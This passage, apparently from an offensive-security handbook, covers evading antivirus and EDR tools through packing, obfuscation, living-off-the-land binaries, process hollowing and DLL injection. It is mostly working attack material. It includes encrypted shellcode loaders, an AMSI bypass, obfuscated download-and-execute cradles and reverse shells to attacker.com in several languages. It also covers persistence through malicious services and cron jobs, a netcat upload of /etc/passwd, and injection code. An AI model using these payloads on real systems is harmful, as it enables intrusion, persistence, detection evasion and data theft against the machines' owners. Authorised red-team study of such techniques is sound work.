# Not available on Kali by default
```

**Enigma Protector:**

```bash
# Commercial packer
# Provides virtual machine protection
# Windows-only GUI tool
```

**MPRESS:**

```bash
# Free alternative to UPX
wget http://www.matcode.com/mpress.219.zip
unzip mpress.219.zip
./mpress -s payload.exe
```

**Custom Packing with Python:**

```python
#!/usr/bin/env python3
import sys
import zlib
import base64

# Read original payload
with open(sys.argv[1], 'rb') as f:
    payload = f.read()

# Compress
compressed = zlib.compress(payload, 9)

# Encrypt with XOR
key = b'SecretKey123'
encrypted = bytes([compressed[i] ^ key[i % len(key)] for i in range(len(compressed))])

# Base64 encode
encoded = base64.b64encode(encrypted)

# Generate loader stub
stub = f'''
import zlib, base64
key = b'SecretKey123'
data = base64.b64decode({encoded})
decrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
exec(zlib.decompress(decrypted))
'''

with open('packed.py', 'w') as f:
    f.write(stub)
```

**PE Format Packing (Windows):**

```bash
# Generate shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f raw -o shellcode.bin

# Create PE loader with encryption
cat > loader.c << 'EOF'
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {
    // Encrypted shellcode here
};

void xor_decrypt(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

int main() {
    xor_decrypt(shellcode, sizeof(shellcode), 0xAA);
    
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    
    return 0;
}
EOF

# Compile on Kali (requires mingw)
x86_64-w64-mingw32-gcc loader.c -o packed.exe

# Or for 32-bit
i686-w64-mingw32-gcc loader.c -o packed32.exe
```

**AES Encryption Packing:**

```python
#!/usr/bin/env python3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import sys

# Read payload
with open(sys.argv[1], 'rb') as f:
    payload = f.read()

# AES encryption
key = b'Sixteen byte key'  # 16 bytes for AES-128
cipher = AES.new(key, AES.MODE_CBC)
encrypted = cipher.encrypt(pad(payload, AES.block_size))

# Generate C# loader
loader = f'''
using System;
using System.Security.Cryptography;
using System.IO;
using System.Runtime.InteropServices;

class Program {{
    [DllImport("kernel32")]
    static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
    
    [DllImport("kernel32")]
    static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr id);
    
    static void Main() {{
        byte[] encrypted = Convert.FromBase64String("{base64.b64encode(encrypted).decode()}");
        byte[] iv = {{ {','.join([str(b) for b in cipher.iv])} }};
        byte[] key = {{ {','.join([str(b) for b in key])} }};
        
        using (Aes aes = Aes.Create()) {{
            aes.Key = key;
            aes.IV = iv;
            using (MemoryStream ms = new MemoryStream()) {{
                using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write)) {{
                    cs.Write(encrypted, 0, encrypted.Length);
                }}
                byte[] shellcode = ms.ToArray();
                IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40);
                Marshal.Copy(shellcode, 0, addr, shellcode.Length);
                CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                System.Threading.Thread.Sleep(10000);
            }}
        }}
    }}
}}
'''

with open('encrypted_loader.cs', 'w') as f:
    f.write(loader)

print("[+] Compile with: csc.exe /unsafe encrypted_loader.cs")
```

**Hyperion (AES Crypter):**

```bash
git clone https://github.com/nullsecuritynet/tools/tree/main/binary/hyperion
cd hyperion

# Windows compilation required
# Use on Windows or Wine:
wine hyperion.exe payload.exe encrypted.exe
```

**Shellter (Dynamic PE Injector):**

```bash
# Available on Kali
apt install shellter

# Interactive mode
shellter

# Options:
# A - Auto mode
# Select target PE (32-bit only)
# Select payload or custom shellcode
# Enable stealth mode
# Enable threading

# Example automation
echo -e "A\n/path/to/target.exe\nL\n1\n<attacker_ip>\n<port>\nY" | shellter
```

### Code Obfuscation

Code obfuscation transforms source/binary code to evade analysis while maintaining functionality.

**PowerShell Obfuscation:**

**Invoke-Obfuscation Tool:**

```bash
# Install
git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
cd Invoke-Obfuscation

# Launch (requires PowerShell)
pwsh
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation

# Commands:
SET SCRIPTPATH /path/to/payload.ps1
TOKEN           # Tokenize obfuscation
STRING          # String obfuscation
ENCODING        # Encoding obfuscation
COMPRESS        # Compression
LAUNCHER        # Launcher obfuscation

# Example chain:
TOKEN\ALL\1
ENCODING\1
LAUNCHER\STDIN++\1234
OUT /tmp/obfuscated.ps1
```

**Manual PowerShell Obfuscation:**

```powershell
# Original payload
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

# Base64 encoding
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded

# String concatenation
I`E`X (N`ew-Obj`ect N`et.W`ebCli`ent).D`ownload`Str`ing('ht'+'tp://att'+'acker.com/pa'+'yload.ps1')

# Variable substitution
$a='IEX';$b='New-Object';$c='Net.WebClient';$d='DownloadString';& $a (& $b $c).$d('http://attacker.com/payload.ps1')

# Reordering + aliases
$wc = New-Object Net.WebClient; $url = 'http://attacker.com/payload.ps1'; IEX $wc.DownloadString($url)

# Character substitution
$cmd = [char]73+[char]69+[char]88; & $cmd (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

# Invoke-Expression alternatives
.($PSHome[4]+$PSHome[30]+'x')  # IEX
& ([scriptblock]::Create((New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')))

# AMSI bypass obfuscation
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+[char]109+[char]115+[char]105+[char]85+[char]116+[char]105+[char]108+[char]115)).GetField($([char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[char]105+[char]116+[char]70+[char]97+[char]105+[char]108+[char]101+[char]100),'NonPublic,Static').SetValue($null,$true)
```

**Python Obfuscation:**

**PyArmor:**

```bash
# Install
pip3 install pyarmor

# Obfuscate single file
pyarmor obfuscate payload.py

# Obfuscate with advanced options
pyarmor obfuscate --advanced 2 --restrict 0 payload.py

# Output in dist/ directory
```

**Manual Python Obfuscation:**

```python
# Original
import os
os.system('whoami')

# Base64 + exec
import base64
exec(base64.b64decode('aW1wb3J0IG9zCm9zLnN5c3RlbSgnd2hvYW1pJyk='))

# Lambda + compile
(lambda: [__import__('os').system('whoami')])()

# String obfuscation
__import__(''.join([chr(111),chr(115)])).system(''.join([chr(119),chr(104),chr(111),chr(97),chr(109),chr(105)]))

# Marshal + zlib
import marshal, zlib, base64
code = marshal.dumps(compile('import os; os.system("whoami")', '<string>', 'exec'))
compressed = zlib.compress(code)
exec(marshal.loads(zlib.decompress(compressed)))
```

**Bashfuscator (Bash Obfuscation):**

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools
python3 setup.py install

# Obfuscate command
bashfuscator -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# Output obfuscated version
bashfuscator -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' -o obfuscated.sh

# Specify obfuscation level
bashfuscator -c 'whoami' -s 1  # Difficulty level 1-5
```

**C/C++ Obfuscation:**

**LLVM-Obfuscator:**

```bash
# Clone and build (requires LLVM)
git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git
cd obfuscator
mkdir build
cd build
cmake -DCMAKE_BUILD_TYPE=Release ../
make -j4

# Compile with obfuscation
/path/to/obfuscator/bin/clang -mllvm -fla -mllvm -sub -mllvm -bcf source.c -o obfuscated

# Flags:
# -fla: Control flow flattening
# -sub: Instruction substitution
# -bcf: Bogus control flow
```

**Manual C Obfuscation Techniques:**

```c
// String encryption
char encrypted[] = {0x68^0xAA, 0x65^0xAA, 0x6C^0xAA, 0x6C^0xAA, 0x6F^0xAA, 0x00};
for (int i = 0; i < sizeof(encrypted); i++) encrypted[i] ^= 0xAA;
printf("%s", encrypted);

// Function pointer obfuscation
void (*func_ptr)() = &malicious_function;
(*func_ptr)();

// Control flow obfuscation
switch(rand() % 3) {
    case 0: goto label1;
    case 1: goto label2;
    default: goto label3;
}

// Dead code insertion
if (1 == 0) { /* Never executed */ }
```

**.NET Obfuscation:**

**ConfuserEx:**

```bash
# Download from https://github.com/yck1509/ConfuserEx
# Windows GUI tool

# Alternative: CLI usage
ConfuserEx.CLI.exe -n payload.exe

# Project configuration (project.crproj):
<module path="payload.exe">
  <rule pattern="true" inherit="false">
    <protection id="anti ildasm" />
    <protection id="anti tamper" />
    <protection id="constants" />
    <protection id="ctrl flow" />
    <protection id="ref proxy" />
    <protection id="rename" />
  </rule>
</module>
```

**Eazfuscator.NET:**

```bash
# Commercial obfuscator
# GUI-based for Windows
# Not available on Kali
```

**Manual .NET Obfuscation:**

```csharp
// String encryption
string encrypted = Convert.ToBase64String(Encoding.UTF8.GetBytes("malicious"));
string decrypted = Encoding.UTF8.GetString(Convert.FromBase64String(encrypted));

// Reflection obfuscation
Type type = Type.GetType("System.Diagnostics.Process");
MethodInfo method = type.GetMethod("Start", new Type[] { typeof(string) });
method.Invoke(null, new object[] { "cmd.exe" });

// P/Invoke obfuscation
[DllImport("kernel32", EntryPoint = "VirtualAlloc")]
static extern IntPtr VA(IntPtr a, uint s, uint t, uint p);
```

### Living-off-the-Land Binaries (LOLBins/LOLBAS)

LOLBins are legitimate system binaries misused for malicious purposes, evading application whitelisting and reducing detection. **[Inference]** EDRs may detect unusual parameter combinations or execution contexts, but not the binaries themselves.

**Windows LOLBins (LOLBAS):**

**Certutil (File Download & Encoding):**

```cmd
REM Download file
certutil.exe -urlcache -f http://attacker.com/payload.exe C:\Temp\payload.exe

REM Alternative download method
certutil.exe -verifyctl -split -f http://attacker.com/payload.exe

REM Base64 decode
certutil.exe -decode encoded.txt payload.exe

REM Base64 encode
certutil.exe -encode payload.exe encoded.txt
```

**BITSAdmin (Background Download):**

```cmd
REM Create download job
bitsadmin /transfer myDownload http://attacker.com/payload.exe C:\Temp\payload.exe

REM Advanced usage
bitsadmin /create myJob
bitsadmin /addfile myJob http://attacker.com/payload.exe C:\Temp\payload.exe
bitsadmin /resume myJob
bitsadmin /complete myJob

REM Priority settings (stealthier)
bitsadmin /setpriority myJob FOREGROUND
```

**PowerShell Download:**

```powershell
# WebClient
(New-Object Net.WebClient).DownloadFile('http://attacker.com/payload.exe', 'C:\Temp\payload.exe')

# Invoke-WebRequest
Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\Temp\payload.exe

# Short alias
iwr -Uri http://attacker.com/payload.exe -OutFile C:\Temp\payload.exe

# Download and execute in memory
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

# BITS transfer
Import-Module BitsTransfer
Start-BitsTransfer -Source http://attacker.com/payload.exe -Destination C:\Temp\payload.exe
```

**Rundll32 (DLL Execution):**

```cmd
REM Execute DLL function
rundll32.exe payload.dll,EntryPoint

REM JavaScript/VBScript execution
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd /c whoami")

REM URL execution
rundll32.exe url.dll,OpenURL http://attacker.com/payload.hta

REM FileProtocolHandler
rundll32.exe url.dll,FileProtocolHandler file://attacker.com/payload.exe
```

**Regsvr32 (Scriptlet Execution):**

```cmd
REM Remote scriptlet
regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

REM Local scriptlet
regsvr32.exe /s /n /u /i:C:\Temp\payload.sct scrobj.dll

REM Unregister flag bypass
regsvr32.exe /u /n /s /i:http://attacker.com/payload.sct scrobj.dll
```

**Example Scriptlet (payload.sct):**

```xml
<?XML version="1.0"?>
<scriptlet>
<registration
    progid="PoC"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
    <script language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("cmd /c powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')");
        ]]>
    </script>
</registration>
</scriptlet>
```

**Mshta (HTML Application Execution):**

```cmd
REM Remote HTA
mshta.exe http://attacker.com/payload.hta

REM Inline JavaScript
mshta.exe javascript:close(new%20ActiveXObject("WScript.Shell").Run("cmd /c whoami"))

REM VBScript
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c whoami"":close")

REM File protocol
mshta.exe file://C:\Temp\payload.hta
```

**Wmic (Process Execution & Queries):**

```cmd
REM Execute process
wmic process call create "cmd.exe /c whoami"

REM Remote execution
wmic /node:<target_ip> /user:<username> /password:<password> process call create "cmd.exe /c payload.exe"

REM XSL execution
wmic os get /format:"http://attacker.com/payload.xsl"

REM Local XSL
wmic process get brief /format:C:\Temp\payload.xsl
```

**Example XSL Payload:**

```xml
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" version="1.0">
<output method="text"/>
<template match="/">
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd /c powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')");
]]>
</script>
</template>
</stylesheet>
```

**InstallUtil (Managed Code Execution):**

```cmd
REM Execute .NET assembly
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

REM 64-bit version
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

**Example Payload (C#):**

```csharp
using System;
using System.Configuration.Install;

public class Program {
    public static void Main() { }
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : Installer {
    public override void Uninstall(System.Collections.IDictionary savedState) {
        // Malicious code here
        System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
    }
}
```

**Regasm/Regsvcs (COM Registration):**

```cmd
REM Execute .NET assembly
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U payload.dll

C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe payload.dll
```

**MSBuild (Project File Execution):**

```cmd
REM Execute inline C# code
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.csproj

REM 64-bit version
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj
```

**Example MSBuild Payload (payload.csproj):**

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Exec">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;
          using System;
          using System.Diagnostics;
          
          public class ClassExample : Task {
            public override bool Execute() {
              Process.Start("cmd.exe", "/c whoami");
              return true;
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

**Forfiles (Indirect Execution):**

```cmd
REM Execute command
forfiles /p c:\windows\system32 /m notepad.exe /c "cmd /c whoami"

REM Alternative
forfiles /p c:\windows\system32 /m cmd.exe /c "cmd /c payload.exe"
```

**Msiexec (MSI Package Execution):**

```cmd
REM Remote MSI
msiexec /quiet /i http://attacker.com/payload.msi

REM Local MSI
msiexec /quiet /i C:\Temp\payload.msi

REM With no UI
msiexec /q /i http://attacker.com/payload.msi
```

**Linux LOLBins:**

**Curl/Wget (File Download):**

```bash
# Curl download
curl http://attacker.com/payload.sh -o /tmp/payload.sh

# Wget download
wget http://attacker.com/payload.sh -O /tmp/payload.sh

# Execute directly
curl http://attacker.com/payload.sh | bash
wget -qO- http://attacker.com/payload.sh | bash

# Silent download
curl -s http://attacker.com/payload.sh -o /tmp/payload.sh
wget -q http://attacker.com/payload.sh -O /tmp/payload.sh
```

**Python (Code Execution):**

```bash
# Execute Python code
python -c 'import os; os.system("whoami")'
python3 -c 'import os; os.system("whoami")'

# Download and execute
python -c 'import urllib; urllib.urlretrieve("http://attacker.com/payload.py", "/tmp/p.py")'
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://attacker.com/payload.py", "/tmp/p.py")'

# Reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

````

**Perl (Code Execution):**

```bash
# Execute command
perl -e 'system("whoami")'
perl -e 'exec("whoami")'

# Reverse shell
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Download file
perl -e 'use LWP::Simple; getstore("http://attacker.com/payload.sh", "/tmp/payload.sh")'
````

**PHP (Code Execution):**

```bash
# Execute command
php -r 'system("whoami");'
php -r 'exec("whoami");'

# Reverse shell
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# Download file
php -r 'file_put_contents("/tmp/payload.php", file_get_contents("http://attacker.com/payload.php"));'
```

**Ruby (Code Execution):**

```bash
# Execute command
ruby -e 'system("whoami")'
ruby -e 'exec("whoami")'

# Reverse shell
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Download file
ruby -e 'require "net/http"; File.write("/tmp/payload.rb", Net::HTTP.get(URI("http://attacker.com/payload.rb")))'
```

**Bash/Sh (Built-in Features):**

```bash
# Reverse shell using /dev/tcp
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Alternative syntax
bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# Using exec
exec 5<>/dev/tcp/attacker.com/4444;cat <&5 | while read line; do $line 2>&5 >&5; done

# File download with /dev/tcp
exec 3<>/dev/tcp/attacker.com/80
echo -e "GET /payload.sh HTTP/1.1\nHost: attacker.com\n\n" >&3
cat <&3 > /tmp/payload.sh
```

**Nc/Netcat (Network Operations):**

```bash
# Reverse shell
nc -e /bin/bash attacker.com 4444

# Without -e flag
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc attacker.com 4444 >/tmp/f

# File download
nc attacker.com 8080 > /tmp/payload.sh

# File upload
nc attacker.com 8080 < /etc/passwd
```

**Nmap (Script Execution):**

```bash
# Execute Lua script
nmap --script=<(curl http://attacker.com/payload.nse)

# Interactive mode
nmap --interactive
!sh

# Lua execution
echo 'os.execute("/bin/bash")' > /tmp/payload.nse
nmap --script=/tmp/payload.nse
```

**Find (Command Execution):**

```bash
# Execute command on found files
find / -name "*.txt" -exec whoami \;

# Reverse shell
find / -name "test" -exec bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' \;

# Download and execute
find / -name "test" -exec curl http://attacker.com/payload.sh -o /tmp/p.sh \;
find / -name "test" -exec bash /tmp/p.sh \;
```

**Awk (Code Execution):**

```bash
# Execute command
awk 'BEGIN {system("whoami")}'

# Reverse shell
awk 'BEGIN {s = "/inet/tcp/0/attacker.com/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

**Vim/Vi (Command Execution):**

```bash
# From within vim
:!whoami
:!/bin/bash
:set shell=/bin/bash:shell

# Command line
vim -c ':!whoami' -c ':q'
vim -c ':py import os; os.system("whoami")' -c ':q'

# With Python
vim -c ':py3 import os; os.system("whoami")' -c ':q'
```

**Less/More (Command Execution):**

```bash
# From within less
!whoami
!/bin/bash

# Viewing file triggers
less /etc/passwd
# Press 'v' to open in editor, then use editor escape
```

**Man (Command Execution):**

```bash
# From within man page
!whoami
!/bin/bash

# Command line
man man
# Press '!' then enter command
```

**Tar (Command Execution via Checkpoints):**

```bash
# Create malicious checkpoint
echo 'whoami' > /tmp/shell.sh
chmod +x /tmp/shell.sh

# Execute via tar
tar cf archive.tar * --checkpoint=1 --checkpoint-action=exec=/tmp/shell.sh

# Alternative
tar -cf archive.tar /tmp --checkpoint=1 --checkpoint-action=exec=sh\ /tmp/shell.sh
```

**Zip (Command Execution):**

```bash
# UnZip with command execution
echo "test" > test.txt
zip test.zip test.txt -T --unzip-command="sh -c whoami"

# Alternative
zip test.zip test.txt -TT 'sh #'
```

**Git (Command Execution):**

```bash
# Git hooks
echo '#!/bin/bash' > .git/hooks/pre-commit
echo 'whoami' >> .git/hooks/pre-commit
chmod +x .git/hooks/pre-commit
git commit -m "test"

# Pager escape
PAGER='sh -c "whoami >&2; less"' git log

# Git help
git help status
# Press '!' then enter command
```

**Ssh/Scp (Remote Execution):**

```bash
# SSH with command
ssh user@target "whoami"

# ProxyCommand execution
ssh -o ProxyCommand="sh -c 'whoami; exit'" target

# LocalCommand execution (requires PermitLocalCommand yes)
ssh -o LocalCommand="whoami" -o PermitLocalCommand=yes target
```

**Docker (Container Escape):**

```bash
# Mount host filesystem
docker run -v /:/hostfs -it ubuntu bash
chroot /hostfs

# Privileged container
docker run --privileged -it ubuntu bash
# Access host resources

# Socket mount
docker run -v /var/run/docker.sock:/var/run/docker.sock -it docker
docker run --privileged -it ubuntu bash
```

**Systemctl (Service Manipulation):**

```bash
# Create malicious service
cat > /tmp/malicious.service << EOF
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
[Install]
WantedBy=multi-user.target
EOF

# Load and start
systemctl link /tmp/malicious.service
systemctl start malicious.service

# Alternative (requires root)
systemctl edit --full --force malicious.service
# Add malicious ExecStart
systemctl start malicious.service
```

**Crontab (Scheduled Execution):**

```bash
# Add malicious cron job
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -

# Alternative
echo "* * * * * /tmp/payload.sh" | crontab -

# System-wide (requires root)
echo "* * * * * root /tmp/payload.sh" >> /etc/crontab
```

**LOLBins Discovery Resources:**

**Windows:**

- LOLBAS Project: https://lolbas-project.github.io/
- Search binaries: https://lolbas-project.github.io/api/

**Linux:**

- GTFOBins: https://gtfobins.github.io/
- Search binaries with escape capabilities

**Detection Evasion with LOLBins:**

```bash
# Timestomping (Windows)
powershell (Get-Item payload.exe).CreationTime=("01 January 2020 12:00:00")
powershell (Get-Item payload.exe).LastWriteTime=("01 January 2020 12:00:00")

# Timestomping (Linux)
touch -d "2020-01-01 12:00:00" payload.sh

# Process name masquerading (Linux)
cp /bin/bash /tmp/[kworker/0:0]
/tmp/[kworker/0:0]  # Appears as kernel thread

# Parent process spoofing (Windows - requires PPID spoofing code)
# Use SelectMyParent or similar tools

# Command line obfuscation (Windows)
cmd /c "w^h^o^a^m^i"
cmd /V /C "set cmd=whoami&!cmd!"

# Command line obfuscation (Linux)
w\ho\am\i
who''am''i
who$@ami
who${IFS}ami
```

**EDR Evasion Strategies:**

**[Inference]** EDRs may detect LOLBin abuse through:

- Abnormal parent-child process relationships
- Unusual command-line parameters
- Unexpected network connections from system binaries
- Behavioral analysis of binary execution patterns

**Evasion techniques:**

```bash
# Sleep delays to evade behavioral analysis
timeout /t 60  # Windows
sleep 60       # Linux

# Parent process manipulation
# Spawn from legitimate parent (explorer.exe, svchost.exe)

# Limit network activity patterns
# Use HTTPS instead of HTTP
# Mimic legitimate traffic patterns

# Execute during high-activity periods
# Blend with normal system operations
```

**Combined Evasion Example (Windows):**

```powershell
# Multi-stage obfuscated download and execution
$url = -join('ht','tp://at','tac','ker.com/p','ay','load.ps1')
$path = $env:TEMP + '\' + -join((1..8|%{[char](Get-Random -Min 65 -Max 90)})) + '.ps1'
$wc = New-Object Net.WebClient
$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
Start-Sleep -Seconds 30
$wc.DownloadFile($url, $path)
Start-Sleep -Seconds 15
& $path
Start-Sleep -Seconds 10
Remove-Item $path -Force
```

**Combined Evasion Example (Linux):**

```bash
# Multi-stage obfuscated download and execution
url="ht""tp://at""tac""ker.com/pa""yload.sh"
path="/tmp/.$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)"
sleep 30
curl -s -A "Mozilla/5.0 (X11; Linux x86_64)" "$url" -o "$path"
sleep 15
chmod +x "$path"
"$path" &
sleep 10
rm -f "$path"
```

**Additional Evasion Tools:**

**Veil Framework (Multi-AV Evasion):**

```bash
# Install
apt install veil

# Launch
veil

# Options:
# 1. Evasion
# 2. Select payload (Python, PowerShell, C#, etc.)
# 3. Configure options
# 4. Generate

# Example: PowerShell reverse shell
use evasion
use powershell/meterpreter/rev_tcp
set LHOST attacker_ip
set LPORT 4444
generate
```

**[Unverified]** Effectiveness varies significantly across AV/EDR vendors and versions. Regular testing required.

---

**Related Topics for Comprehensive AV/EDR Evasion:**

- AMSI (Anti-Malware Scan Interface) bypass techniques
- ETW (Event Tracing for Windows) patching
- User-mode hooking detection and bypass
- Kernel-mode callback evasion
- Direct syscalls and syscall unhooking
- Process injection techniques (Process Hollowing, Thread Execution Hijacking, AtomBombing)
- In-memory execution and reflective DLL loading

---

### Process Hollowing

Process hollowing (also called process replacement or RunPE) is a technique where a legitimate process is created in a suspended state, its memory is unmapped, and malicious code is written into the hollowed process space before resuming execution.

#### Technical Mechanism

**Steps involved**:

1. Create target process in suspended state (`CREATE_SUSPENDED` flag)
2. Query process memory layout to locate base address
3. Unmap legitimate executable from memory (`NtUnmapViewOfSection`)
4. Allocate new memory in target process (`VirtualAllocEx`)
5. Write malicious PE into allocated space (`WriteProcessMemory`)
6. Update entry point in thread context (`SetThreadContext`)
7. Resume primary thread (`ResumeThread`)

#### Windows API Implementation Pattern

**C/C++ skeleton** (educational reference):

```c
// Step 1: Create suspended process
STARTUPINFO si = {0};
PROCESS_INFORMATION pi = {0};
si.cb = sizeof(si);

CreateProcessA(
    "C:\\Windows\\System32\\svchost.exe",  // Target process
    NULL,
    NULL, NULL, FALSE,
    CREATE_SUSPENDED,  // Critical flag
    NULL, NULL, &si, &pi
);

// Step 2: Get thread context
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);

// Step 3: Unmap original executable
NtUnmapViewOfSection(pi.hProcess, pImageBase);

// Step 4-6: Allocate, write, modify context
VirtualAllocEx(pi.hProcess, pImageBase, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, pImageBase, pMaliciousPayload, dwImageSize, NULL);
ctx.Eax = (DWORD)pImageBase + pOptionalHeader->AddressOfEntryPoint;  // x86 example
SetThreadContext(pi.hThread, &ctx);

// Step 7: Resume execution
ResumeThread(pi.hThread);
```

**[Inference]** Modern EDR solutions monitor `NtUnmapViewOfSection` calls and suspicious process creation patterns. Detection likelihood is high without additional obfuscation.

#### Detection Vectors

EDR solutions commonly detect process hollowing through:

- **API call sequences**: `CreateProcess` + `NtUnmapViewOfSection` + `WriteProcessMemory` + `SetThreadContext`
- **Memory analysis**: Mismatched PE headers vs. disk image
- **Thread start addresses**: Entry points not matching loaded modules
- **Parent-child process anomalies**: Unusual parent processes

#### Evasion Refinements

**Direct syscalls** (bypass user-mode hooks):

```c
// Use direct syscalls instead of kernel32.dll/ntdll.dll APIs
// Requires manual syscall number resolution
```

Tools like **SysWhispers** generate syscall stubs to avoid hooked APIs.

**Module stomping variant**: Instead of unmapping, overwrite existing loaded DLL memory regions rather than the main executable.

**Transacted hollowing**: Use NTFS transactions to create/modify process memory without writing to disk persistently.

#### Tools and Frameworks

**Process Hacker** - Analyze running processes to understand memory layout for developing custom hollowing techniques.

**pe-sieve** - Detection tool (useful for testing your evasion):

```bash
pe-sieve.exe /pid <target_pid> /shellc 1
```

**Metasploit process injection** (includes hollowing variants):

```bash
use exploit/windows/local/process_hollowing
set SESSION <meterpreter_session_id>
set TARGET_PID <pid_to_hollow>
run
```

**[Unverified]** Process hollowing success rates vary significantly based on EDR vendor and configuration. Modern solutions like CrowdStrike Falcon and Microsoft Defender for Endpoint detect basic implementations reliably.

### DLL Injection for Hiding

DLL injection loads malicious code into legitimate processes to evade detection by disguising malicious activity as trusted process behavior.

#### Classic DLL Injection Techniques

**1. CreateRemoteThread Injection**

Most common method, heavily monitored by EDR:

```c
// Open target process
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTargetPID);

// Allocate memory for DLL path
LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_COMMIT, PAGE_READWRITE);

// Write DLL path to target process
WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath), NULL);

// Get LoadLibraryA address (same across processes in same Windows version)
LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

// Create remote thread executing LoadLibraryA with DLL path parameter
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteMemory, 0, NULL);
```

